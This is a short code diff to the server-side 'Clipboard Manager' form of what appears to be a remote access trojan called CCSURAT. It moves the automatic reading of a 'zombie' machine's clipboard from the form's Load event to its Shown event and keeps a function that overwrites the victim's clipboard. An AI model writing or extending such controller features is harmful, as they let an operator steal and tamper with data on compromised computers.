@@ -21,11 +21,6 @@ namespace CCSURAT_Server.ControlForms
             this.Text = zombie.IP + " - " + zombie.computerName + " - Clipboard Manager";
         }
 
-        private void Clipboard_Load(object sender, EventArgs e)
-        {
-            GetClipboard();
-        }
-
         private void setClipboardToolStripMenuItem_Click(object sender, EventArgs e)
         {
             SetClipboard();
@@ -36,6 +31,7 @@ namespace CCSURAT_Server.ControlForms
             GetClipboard();
         }
 
+        // Sends command to client to request the clipboard contents.
         private void GetClipboard()
         {
             zombie.clipboard = string.Empty;
@@ -55,6 +51,11 @@ namespace CCSURAT_Server.ControlForms
         private void SetClipboard()
         {
             zombie.SendData("[[CLIPBOARD]]" + clipboardTextbox.Text + "[[/CLIPBOARD]]");
+        }
+
+        private void Clipboard_Shown(object sender, EventArgs e)
+        {
+            GetClipboard();
         }
     }
 }
